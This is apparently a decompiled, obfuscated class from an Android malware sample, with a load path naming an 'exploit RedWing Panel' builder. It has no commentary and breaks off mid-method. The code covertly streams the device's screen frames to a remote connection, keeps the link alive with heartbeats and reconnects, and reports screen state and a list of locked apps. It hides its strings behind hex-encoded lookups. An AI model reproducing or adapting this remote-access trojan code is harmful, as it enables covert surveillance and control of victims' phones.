package v.s;

import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.util.TypefaceCache;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.TimeUnit;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class uY2iPU7ne5s7Y5LeXnLI implements Runnable {
    public final /* synthetic */ RWY6BVSB0XxPbw vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ uY2iPU7ne5s7Y5LeXnLI(RWY6BVSB0XxPbw rWY6BVSB0XxPbw, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = rWY6BVSB0XxPbw;
    }

    private final void D5P1xCAyuvgF() {
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
        rWY6BVSB0XxPbw.xDyLpEZyrcKVe0 = false;
        try {
            J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = rWY6BVSB0XxPbw.vekpFI4d1Nc4fakF;
            if (j1m0XraSkScfWFMIlTC != null) {
                j1m0XraSkScfWFMIlTC.w9sT1Swbhx3hs("", 1000);
            }
        } catch (Exception unused) {
        }
    }

    private final void Ee8d2j4S9Vm5yGuR() {
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
        if (!rWY6BVSB0XxPbw.xDyLpEZyrcKVe0 || rWY6BVSB0XxPbw.XiR1pIn5878vVWd) {
            return;
        }
        rWY6BVSB0XxPbw.iUQk66nAiXgO35(rWY6BVSB0XxPbw.gIIiyi2ddlMDR0);
    }

    private final void JXn4Qf7zpnLjP5() {
        try {
            Context context = this.vekpFI4d1Nc4fakF.dDIMxZXP1V8HdM;
            String str = ManagerUMController.DVTNwpDEVsUKuznof;
            Intent intent = new Intent(context, (Class<?>) ManagerUMController.class);
            intent.putExtra(ManagerUMController.yTljMGnIibTRdOpSh4, ManagerUMController.O2DHNSIGZlgPja7eqLgn);
            context.startService(intent);
        } catch (Exception e) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300FF00AF0092008A00220078005A008000F500AD00E7008A000000790055009300E200B000DE00AB00260064000100C7");
            e.getMessage();
        }
    }

    private final void b1EoSIRjJHO5() {
        iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
        this.vekpFI4d1Nc4fakF.b1EoSIRjJHO5();
    }

    private static /* synthetic */ void cmrdtfptll() {
    }

    private final void dDIMxZXP1V8HdM() {
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
        int i = 0;
        while (rWY6BVSB0XxPbw.XiR1pIn5878vVWd && rWY6BVSB0XxPbw.xDyLpEZyrcKVe0) {
            try {
                long j = 1;
                if (rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.get() >= 8) {
                    if (System.currentTimeMillis() - rWY6BVSB0XxPbw.UoxIZOBVZaubOFdPNaXK > 2000) {
                        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.set(0);
                    } else {
                        Thread.sleep(1L);
                    }
                }
                x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
                x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp2 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
                if (x1g2i7kvsdxo3fp2 == null) {
                    Thread.sleep(100L);
                } else {
                    if (x1g2i7kvsdxo3fp2.D5P1xCAyuvgF.size() > 6) {
                        ArrayList arrayList = new ArrayList();
                        while (true) {
                            byte[] bArr = (byte[]) x1g2i7kvsdxo3fp2.D5P1xCAyuvgF.poll();
                            if (bArr == null) {
                                break;
                            }
                            byte b = bArr[0];
                            if (b == 1 || b == 2) {
                                arrayList.add(bArr);
                            }
                        }
                        int size = arrayList.size();
                        int i2 = 0;
                        while (i2 < size) {
                            Object obj = arrayList.get(i2);
                            i2++;
                            x1g2i7kvsdxo3fp2.D5P1xCAyuvgF.offer((byte[]) obj);
                        }
                        if (arrayList.isEmpty()) {
                            x1g2i7kvsdxo3fp2.w9sT1Swbhx3hs();
                        }
                        TypefaceCache.obtain("000B0024000D00D300AA00FF00C300B200260063005E00C700FF00A900D700B50025007A0054009000B000F7");
                        TypefaceCache.obtain("006A003A001B008300E200B000C200B700260072001B");
                        TypefaceCache.obtain("0063007F0055009300F500AD009E00E700280073004B009300B0");
                        arrayList.size();
                        TypefaceCache.obtain("0063007D005E009E00BF00BC00DD00A90025007F005C");
                    }
                    byte[] bArr2 = (byte[]) x1g2i7kvsdxo3fp2.D5P1xCAyuvgF.poll();
                    if (bArr2 != null) {
                        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.incrementAndGet();
                        long jCurrentTimeMillis = System.currentTimeMillis();
                        rWY6BVSB0XxPbw.UoxIZOBVZaubOFdPNaXK = jCurrentTimeMillis;
                        rWY6BVSB0XxPbw.yTljMGnIibTRdOpSh4 = jCurrentTimeMillis;
                        if (rWY6BVSB0XxPbw.EWUjsTERgdPbSw3NNlN(fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArr2))) {
                            i++;
                            rWY6BVSB0XxPbw.iUQk66nAiXgO35++;
                            if (i % 30 == 0) {
                                long jCurrentTimeMillis2 = System.currentTimeMillis();
                                long j2 = jCurrentTimeMillis2 - rWY6BVSB0XxPbw.XuO9PPFo607ssKwZjNW;
                                if (j2 >= 1) {
                                    j = j2;
                                }
                                rWY6BVSB0XxPbw.dTS0S7eC32ubQH54j36((rWY6BVSB0XxPbw.iUQk66nAiXgO35 * 1000.0d) / j);
                                rWY6BVSB0XxPbw.XuO9PPFo607ssKwZjNW = jCurrentTimeMillis2;
                                rWY6BVSB0XxPbw.iUQk66nAiXgO35 = 0L;
                            }
                        } else {
                            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.decrementAndGet();
                        }
                    } else {
                        Thread.sleep(3L);
                    }
                }
            } catch (InterruptedException unused) {
            } catch (Exception e) {
                TypefaceCache.obtain("000B0040007500A400B000B300DD00A800330036005E009500E200B000C000FD0063");
                e.getMessage();
            } catch (OutOfMemoryError unused2) {
                TypefaceCache.obtain("000B0040007500A400B000B300DD00A800330036007400A800DD00FF20A600E7002500790049008400F900B100D500E700040055");
                System.gc();
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.set(0);
                try {
                    Thread.sleep(500L);
                } catch (Exception unused3) {
                }
            }
        }
        TypefaceCache.obtain("000B0040007500A400B000B300DD00A800330036005E008900F400BA00D600EB00630065005E008900E400FF");
        TypefaceCache.obtain("006300700049008600FD00BA00C1");
    }

    private final void ibVTtJUNfrGYbW() {
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
        iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
        try {
            DataQFAdapter.Companion.getClass();
            List listDQC4QhgRN3MSEAP3HW0 = imhBI9RqzETHtVIJe.dQC4QhgRN3MSEAP3HW0(DataQFAdapter.autoLockedApps);
            if (listDQC4QhgRN3MSEAP3HW0.isEmpty()) {
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("00220063004F008800CF00B300DD00A400280073005F00B800F100AF00C200B4"));
            jSONObject.put(TypefaceCache.obtain("00220066004B0094"), new JSONArray((Collection) listDQC4QhgRN3MSEAP3HW0));
            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
        } catch (Exception unused) {
        }
    }

    private final void pyu8ovAipBTLYAiKab() {
        iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
        this.vekpFI4d1Nc4fakF.b1EoSIRjJHO5();
    }

    private final void vekpFI4d1Nc4fakF() {
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
        try {
            boolean zIsInteractive = ((PowerManager) rWY6BVSB0XxPbw.dDIMxZXP1V8HdM.getSystemService("power")).isInteractive();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003000750049008200F500B100ED00B400370077004F0082"));
            jSONObject.put(TypefaceCache.obtain("003000750049008200F500B100ED00A8002D"), zIsInteractive);
            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
        } catch (Exception unused) {
        }
    }

    private final void w9sT1Swbhx3hs() {
        TypefaceCache.obtain("0010007D005E008B00F500AB00DD00A9006300620053009500F500BE00D600E700300062005A009500E400BA00D600EB006300750054008900FE00BA00D100B3002600720006");
        while (true) {
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
            if (!rWY6BVSB0XxPbw.Q7qC5ia93qGCjkBXCF0A || !rWY6BVSB0XxPbw.xDyLpEZyrcKVe0) {
                break;
            }
            try {
                rWY6BVSB0XxPbw.K7eEOBPYP9VIoHWTe();
                Thread.sleep(rWY6BVSB0XxPbw.PPWVWMPAUcr9AGNUSxQ >= 10 ? 1500L : 500L);
            } catch (InterruptedException unused) {
                TypefaceCache.obtain("0010007D005E008B00F500AB00DD00A9006300620053009500F500BE00D600E7002A0078004F008200E200AD00C700B700370073005F");
            } catch (Exception e) {
                TypefaceCache.obtain("0010007D005E008B00F500AB00DD00A90063007A0054008800E000FF00D700B500310079004900DD00B0");
                e.getMessage();
            }
        }
        TypefaceCache.obtain("0010007D005E008B00F500AB00DD00A9006300620053009500F500BE00D600E70026006E0052009300F900B100D500EB006300650050008200FC00BA00C600A8002D005B0054008300F500E2");
        TypefaceCache.obtain("006F00360058008800FE00B100D700A400370073005F00DA");
    }

    private final void xDyLpEZyrcKVe0() {
        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
        iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
        try {
            boolean zIsInteractive = ((PowerManager) rWY6BVSB0XxPbw.dDIMxZXP1V8HdM.getSystemService("power")).isInteractive();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003000750049008200F500B100ED00B400370077004F0082"));
            jSONObject.put(TypefaceCache.obtain("003000750049008200F500B100ED00A8002D"), zIsInteractive);
            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
        } catch (Exception unused) {
        }
    }

    @Override // java.lang.Runnable
    public final void run() throws JSONException {
        ByteBuffer byteBuffer;
        ByteBuffer byteBuffer2;
        int i;
        ByteBuffer byteBuffer3;
        boolean z = false;
        int i2 = (-14) + 16;
        int i3 = 1;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.vekpFI4d1Nc4fakF;
                if (rWY6BVSB0XxPbw.ibVTtJUNfrGYbW && !rWY6BVSB0XxPbw.xDyLpEZyrcKVe0) {
                    TypefaceCache.obtain("001100730058008800FE00B100D700A40037007F0055008000BE00F1009C");
                    rWY6BVSB0XxPbw.ibVTtJUNfrGYbW(rWY6BVSB0XxPbw.b1EoSIRjJHO5);
                    break;
                }
                break;
            case 1:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw2 = this.vekpFI4d1Nc4fakF;
                rWY6BVSB0XxPbw2.uCN4HERvZEfG7JjL = false;
                boolean z2 = rWY6BVSB0XxPbw2.ibVTtJUNfrGYbW;
                if (z2) {
                    if (rWY6BVSB0XxPbw2.xDyLpEZyrcKVe0) {
                        try {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("0033007F00550080"));
                            jSONObject.put("ts", System.currentTimeMillis());
                            J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = rWY6BVSB0XxPbw2.vekpFI4d1Nc4fakF;
                            if (!(j1m0XraSkScfWFMIlTC != null ? j1m0XraSkScfWFMIlTC.b1EoSIRjJHO5(jSONObject.toString()) : false)) {
                                rWY6BVSB0XxPbw2.ajrMZmky8AIb2Pr++;
                                TypefaceCache.obtain("0013007F0055008000B000AC00D700A900270036005D008600F900B300D700A30063003E");
                                int i4 = 3;
                                if (rWY6BVSB0XxPbw2.ajrMZmky8AIb2Pr >= 3) {
                                    TypefaceCache.obtain("007000360058008800FE00AC00D700A4003600620052009100F500FF00C200AE002D0071001B008100F100B600DE00B200310073004800CB00B000AD00D700A4002C00780055008200F300AB00DB00A90024");
                                    rWY6BVSB0XxPbw2.xDyLpEZyrcKVe0 = false;
                                    J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC2 = rWY6BVSB0XxPbw2.vekpFI4d1Nc4fakF;
                                    if (j1m0XraSkScfWFMIlTC2 != null) {
                                        j1m0XraSkScfWFMIlTC2.w9sT1Swbhx3hs("", 1000);
                                    }
                                    rWY6BVSB0XxPbw2.nQilHWaqS401ZtR.post(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw2, i4));
                                }
                            } else {
                                rWY6BVSB0XxPbw2.ajrMZmky8AIb2Pr = 0;
                            }
                            long jCurrentTimeMillis = System.currentTimeMillis();
                            long j = jCurrentTimeMillis - rWY6BVSB0XxPbw2.Yrf7mWjzxCbCCUcSPwXl;
                            if (j <= 45000) {
                                long j2 = jCurrentTimeMillis - rWY6BVSB0XxPbw2.t9CXKrwDxrnFA6g23hZU;
                                if (rWY6BVSB0XxPbw2.t9CXKrwDxrnFA6g23hZU > 0 && j2 > 60000) {
                                    TypefaceCache.obtain("000D0079001B008E00FE00BD00DD00B2002D0072001B008300F100AB00D300E700250079004900C7");
                                    long j3 = j2 / ((long) 1000);
                                    TypefaceCache.obtain("0030003A001B008100FF00AD00D100AE002D0071001B009500F500BC00DD00A9002D007300580093");
                                    rWY6BVSB0XxPbw2.xDyLpEZyrcKVe0 = false;
                                    try {
                                        J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC3 = rWY6BVSB0XxPbw2.vekpFI4d1Nc4fakF;
                                        if (j1m0XraSkScfWFMIlTC3 != null) {
                                            j1m0XraSkScfWFMIlTC3.w9sT1Swbhx3hs("", 1000);
                                        }
                                        break;
                                    } catch (Exception unused) {
                                    }
                                    rWY6BVSB0XxPbw2.nQilHWaqS401ZtR.post(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw2, 5));
                                } else if (rWY6BVSB0XxPbw2.XiR1pIn5878vVWd) {
                                    rWY6BVSB0XxPbw2.JXn4Qf7zpnLjP5();
                                    long jCurrentTimeMillis2 = System.currentTimeMillis() - rWY6BVSB0XxPbw2.UoxIZOBVZaubOFdPNaXK;
                                    if (jCurrentTimeMillis2 > 30000) {
                                        TypefaceCache.obtain("001000620049008200F100B200DB00A9002400360048009300F100B300DE00A200270036005D008800E200FF");
                                        long j4 = jCurrentTimeMillis2 / ((long) 1000);
                                        TypefaceCache.obtain("0030003A001B009300E200A600DB00A9002400360058008600E000AB00C700B5002600360049008200E300AB00D300B50037");
                                        rWY6BVSB0XxPbw2.nQilHWaqS401ZtR.post(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw2, 6));
                                    }
                                }
                            } else {
                                TypefaceCache.obtain("000D0079001B009700FF00B100D500E700250079004900C7");
                                long j5 = j / ((long) 1000);
                                TypefaceCache.obtain("0030003A001B008100FF00AD00D100AE002D0071001B009500F500BC00DD00A9002D007300580093");
                                rWY6BVSB0XxPbw2.xDyLpEZyrcKVe0 = false;
                                try {
                                    J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC4 = rWY6BVSB0XxPbw2.vekpFI4d1Nc4fakF;
                                    if (j1m0XraSkScfWFMIlTC4 != null) {
                                        j1m0XraSkScfWFMIlTC4.w9sT1Swbhx3hs("", 1000);
                                    }
                                    break;
                                } catch (Exception unused2) {
                                }
                                rWY6BVSB0XxPbw2.nQilHWaqS401ZtR.post(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw2, 4));
                            }
                        } catch (Exception e) {
                            TypefaceCache.obtain("00080073005E009700F100B300DB00B100260036005E009500E200B000C000FD0063");
                            e.getMessage();
                        }
                    } else if (z2) {
                        if (rWY6BVSB0XxPbw2.b1EoSIRjJHO5.length() > 0) {
                            TypefaceCache.obtain("00080073005E009700F100B300DB00B10026002C001B008900FF00AB009200A4002C00780055008200F300AB00D700A3006F0036005A009300E400BA00DF00B70037007F0055008000B000AD00D700A4002C00780055008200F300AB");
                            rWY6BVSB0XxPbw2.nQilHWaqS401ZtR.post(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw2, 7));
                        }
                    }
                    if (!rWY6BVSB0XxPbw2.uCN4HERvZEfG7JjL) {
                        rWY6BVSB0XxPbw2.uCN4HERvZEfG7JjL = true;
                        rWY6BVSB0XxPbw2.n8nqApvKDYz7s8llJ2jf.schedule(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw2, i3), 12000L, TimeUnit.MILLISECONDS);
                        break;
                    }
                    break;
                }
                break;
            case 2:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw3 = this.vekpFI4d1Nc4fakF;
                int i5 = (-44) + 60;
                ByteBuffer byteBufferAllocate = ByteBuffer.allocate(i5);
                int i6 = 0;
                int i7 = 0;
                long j6 = 0;
                long j7 = 0;
                long j8 = 0;
                while (rWY6BVSB0XxPbw3.XiR1pIn5878vVWd && rWY6BVSB0XxPbw3.xDyLpEZyrcKVe0) {
                    try {
                        try {
                            try {
                                if (rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.get() >= rWY6BVSB0XxPbw3.DVTNwpDEVsUKuznof) {
                                    try {
                                        i = i5;
                                        byteBuffer2 = byteBufferAllocate;
                                        try {
                                            if (System.currentTimeMillis() - rWY6BVSB0XxPbw3.UoxIZOBVZaubOFdPNaXK > 1500) {
                                                TypefaceCache.obtain("00050064005A008A00F500FF00D300A400280036004F008E00FD00BA00DD00B200370036001300D600BE00EA00C100EE006F0036005A009200E400B0009F00B5002600750054009100F500AD00DB00A90024");
                                                rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.set(0);
                                            } else {
                                                Thread.sleep(3L);
                                            }
                                            i5 = i;
                                            byteBufferAllocate = byteBuffer2;
                                        } catch (Exception e2) {
                                            e = e2;
                                            byteBuffer = byteBuffer2;
                                        } catch (OutOfMemoryError unused3) {
                                            byteBuffer = byteBuffer2;
                                            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002F00790054009700B0009000FD008A00632002001B008100FF00AD00D100AE002D0071001B00A000D3");
                                            System.gc();
                                            rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.set(0);
                                            try {
                                                Thread.sleep(500L);
                                                break;
                                            } catch (Exception unused4) {
                                            }
                                            byteBufferAllocate = byteBuffer;
                                            z = false;
                                            i5 = 16;
                                        }
                                    } catch (Exception e3) {
                                        e = e3;
                                        byteBuffer2 = byteBufferAllocate;
                                    }
                                } else {
                                    i = i5;
                                    byteBuffer2 = byteBufferAllocate;
                                }
                                if (rWY6BVSB0XxPbw3.yTljMGnIibTRdOpSh4()) {
                                    Thread.sleep(8L);
                                    i5 = i;
                                    byteBufferAllocate = byteBuffer2;
                                } else {
                                    if (rWY6BVSB0XxPbw3.MSGkxvPxRYNqC) {
                                        String str = ManagerUMController.DVTNwpDEVsUKuznof;
                                        if (!ManagerUMController.VEkRsTDS6a9oHWI) {
                                            rWY6BVSB0XxPbw3.MSGkxvPxRYNqC = false;
                                            rWY6BVSB0XxPbw3.tne6mXOUFKdd = rWY6BVSB0XxPbw3.VEkRsTDS6a9oHWI;
                                            rWY6BVSB0XxPbw3.fivkjwgu2UdAtiY = rWY6BVSB0XxPbw3.jdOQeRk37T35X5xKW1P;
                                            ManagerUMController.XuO9PPFo607ssKwZjNW = rWY6BVSB0XxPbw3.VEkRsTDS6a9oHWI;
                                            ManagerUMController.hV4VTKNUdeHN = rWY6BVSB0XxPbw3.jdOQeRk37T35X5xKW1P;
                                        }
                                    }
                                    String str2 = vbdyByOHPJmeGXlq.dDIMxZXP1V8HdM;
                                    int i8 = i;
                                    if (vbdyByOHPJmeGXlq.D5P1xCAyuvgF) {
                                        DataQFAdapter.Companion.getClass();
                                        if (!DataQFAdapter.isScreenStreaming) {
                                            DataQFAdapter.streamQuality = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(ManagerUMController.XuO9PPFo607ssKwZjNW, 10, 100);
                                            DataQFAdapter.streamWidth = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(ManagerUMController.k84rwRrqzhrNQ1CdNQ9, 240, 720);
                                            GARjgaGEpTotOxcl8vfe.is7XW2V21HfKv7MihWy();
                                        }
                                        byte[] bArr = (byte[]) DataQFAdapter.latestFrame.getAndSet(z);
                                        if (bArr != null) {
                                            try {
                                                int i9 = ManagerUMController.euF5Udt5Rqv3Qmea;
                                                int i10 = ManagerUMController.qfTrc75xwRVMl85vh;
                                                int i11 = DataQFAdapter.streamWidth;
                                                int i12 = (int) ((i11 * i10) / (i9 < 1 ? 1 : i9));
                                                byteBuffer2.clear();
                                                byteBuffer3 = byteBuffer2;
                                                try {
                                                    byteBuffer3.putInt(i11).putInt(i12).putInt(i9).putInt(i10);
                                                    byte[] bArr2 = new byte[bArr.length + 16];
                                                    System.arraycopy(byteBuffer3.array(), 0, bArr2, 0, i8);
                                                    System.arraycopy(bArr, 0, bArr2, i8, bArr.length);
                                                    if (rWY6BVSB0XxPbw3.EWUjsTERgdPbSw3NNlN(fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArr2))) {
                                                        rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.incrementAndGet();
                                                        i7++;
                                                        rWY6BVSB0XxPbw3.iUQk66nAiXgO35++;
                                                        long jCurrentTimeMillis3 = System.currentTimeMillis();
                                                        rWY6BVSB0XxPbw3.UoxIZOBVZaubOFdPNaXK = jCurrentTimeMillis3;
                                                        rWY6BVSB0XxPbw3.yTljMGnIibTRdOpSh4 = jCurrentTimeMillis3;
                                                    }
                                                    byteBuffer = byteBuffer3;
                                                    j6 = 0;
                                                } catch (Exception e4) {
                                                    e = e4;
                                                    byteBuffer = byteBuffer3;
                                                    j6 = 0;
                                                } catch (OutOfMemoryError unused5) {
                                                    byteBuffer = byteBuffer3;
                                                    j6 = 0;
                                                    TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002F00790054009700B0009000FD008A00632002001B008100FF00AD00D100AE002D0071001B00A000D3");
                                                    System.gc();
                                                    rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.set(0);
                                                    Thread.sleep(500L);
                                                    byteBufferAllocate = byteBuffer;
                                                    z = false;
                                                    i5 = 16;
                                                }
                                            } catch (Exception e5) {
                                                e = e5;
                                                byteBuffer3 = byteBuffer2;
                                            } catch (OutOfMemoryError unused6) {
                                                j6 = 0;
                                                byteBuffer = byteBuffer2;
                                                TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002F00790054009700B0009000FD008A00632002001B008100FF00AD00D100AE002D0071001B00A000D3");
                                                System.gc();
                                                rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.set(0);
                                                Thread.sleep(500L);
                                                byteBufferAllocate = byteBuffer;
                                                z = false;
                                                i5 = 16;
                                            }
                                        } else {
                                            byteBuffer = byteBuffer2;
                                            Thread.sleep(8L);
                                        }
                                        try {
                                            rWY6BVSB0XxPbw3.Ee8d2j4S9Vm5yGuR();
                                            byteBufferAllocate = byteBuffer;
                                        } catch (Exception e6) {
                                            e = e6;
                                            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E700250064005A008A00F500FF00DE00A8002C0066001B008200E200AD00DD00B500790036");
                                            e.getMessage();
                                            byteBufferAllocate = byteBuffer;
                                            z = false;
                                        } catch (OutOfMemoryError unused7) {
                                            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002F00790054009700B0009000FD008A00632002001B008100FF00AD00D100AE002D0071001B00A000D3");
                                            System.gc();
                                            rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.set(0);
                                            Thread.sleep(500L);
                                            byteBufferAllocate = byteBuffer;
                                            z = false;
                                        }
                                        i5 = 16;
                                    } else {
                                        byteBuffer = byteBuffer2;
                                        if (!vbdyByOHPJmeGXlq.D5P1xCAyuvgF) {
                                            DataQFAdapter.Companion.getClass();
                                            if (DataQFAdapter.isScreenStreaming) {
                                                String str3 = ManagerUMController.DVTNwpDEVsUKuznof;
                                                if (ManagerUMController.ECwLkmPW1UKz7J6E) {
                                                    GARjgaGEpTotOxcl8vfe.dQC4QhgRN3MSEAP3HW0();
                                                }
                                            }
                                        }
                                        if (rWY6BVSB0XxPbw3.MSGkxvPxRYNqC) {
                                            String str4 = ManagerUMController.DVTNwpDEVsUKuznof;
                                            if (!ManagerUMController.VEkRsTDS6a9oHWI) {
                                                rWY6BVSB0XxPbw3.MSGkxvPxRYNqC = false;
                                                rWY6BVSB0XxPbw3.tne6mXOUFKdd = rWY6BVSB0XxPbw3.VEkRsTDS6a9oHWI;
                                                rWY6BVSB0XxPbw3.fivkjwgu2UdAtiY = rWY6BVSB0XxPbw3.jdOQeRk37T35X5xKW1P;
                                                ManagerUMController.XuO9PPFo607ssKwZjNW = rWY6BVSB0XxPbw3.VEkRsTDS6a9oHWI;
                                                ManagerUMController.hV4VTKNUdeHN = rWY6BVSB0XxPbw3.jdOQeRk37T35X5xKW1P;
                                            }
                                        }
                                        byte[] bArr3 = (byte[]) ManagerUMController.iUQk66nAiXgO35.getAndSet(z);
                                        if (bArr3 != null) {
                                            try {
                                                try {
                                                    int i13 = ManagerUMController.euF5Udt5Rqv3Qmea;
                                                    int i14 = ManagerUMController.qfTrc75xwRVMl85vh;
                                                    int i15 = ManagerUMController.k84rwRrqzhrNQ1CdNQ9;
                                                    int i16 = ManagerUMController.A1BaTVAMeIXMnh;
                                                    if (i13 < 100 || i14 < 100 || i15 < 50 || i16 < 50) {
                                                        TypefaceCache.obtain("000A0078004D008600FC00B600D600E700250064005A008A00F500FF00D600AE002E00730055009400F900B000DC00B400630072004C00DA");
                                                        TypefaceCache.obtain("00630072005300DA");
                                                        TypefaceCache.obtain("00630062004C00DA");
                                                        TypefaceCache.obtain("00630062005300DA");
                                                        TypefaceCache.obtain("006F00360049008200E300AB00D300B50037007F0055008000B000BC00D300B70037006300490082");
                                                        try {
                                                            Context context = rWY6BVSB0XxPbw3.dDIMxZXP1V8HdM;
                                                            context.startService(SbxdZ6Kq2uhHQ5RPRqm.XiR1pIn5878vVWd(context));
                                                            break;
                                                        } catch (Exception unused8) {
                                                        }
                                                        Thread.sleep(500L);
                                                        i6 = 0;
                                                        byteBufferAllocate = byteBuffer;
                                                        j6 = 0;
                                                        i5 = 16;
                                                    } else {
                                                        byteBuffer.clear();
                                                        byteBuffer.putInt(i15).putInt(i16).putInt(i13).putInt(i14);
                                                        try {
                                                            byte[] bArr4 = new byte[bArr3.length + 16];
                                                            System.arraycopy(byteBuffer.array(), 0, bArr4, 0, 16);
                                                            System.arraycopy(bArr3, 0, bArr4, 16, bArr3.length);
                                                            if (rWY6BVSB0XxPbw3.EWUjsTERgdPbSw3NNlN(fadfsJa4iEdiwEC4Xm8.ibVTtJUNfrGYbW(bArr4))) {
                                                                rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.incrementAndGet();
                                                                i7++;
                                                                rWY6BVSB0XxPbw3.iUQk66nAiXgO35++;
                                                                long jCurrentTimeMillis4 = System.currentTimeMillis();
                                                                rWY6BVSB0XxPbw3.UoxIZOBVZaubOFdPNaXK = jCurrentTimeMillis4;
                                                                rWY6BVSB0XxPbw3.yTljMGnIibTRdOpSh4 = jCurrentTimeMillis4;
                                                            }
                                                            i6 = 0;
                                                            j6 = 0;
                                                        } catch (Exception e7) {
                                                            e = e7;
                                                            i6 = 0;
                                                            j6 = 0;
                                                            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E700250064005A008A00F500FF00DE00A8002C0066001B008200E200AD00DD00B500790036");
                                                            e.getMessage();
                                                        }
                                                    }
                                                } catch (OutOfMemoryError unused9) {
                                                    i6 = 0;
                                                    j6 = 0;
                                                    TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002F00790054009700B0009000FD008A00632002001B008100FF00AD00D100AE002D0071001B00A000D3");
                                                    System.gc();
                                                    rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.set(0);
                                                    Thread.sleep(500L);
                                                    break;
                                                }
                                            } catch (Exception e8) {
                                                e = e8;
                                            }
                                            i6 = 0;
                                            j6 = 0;
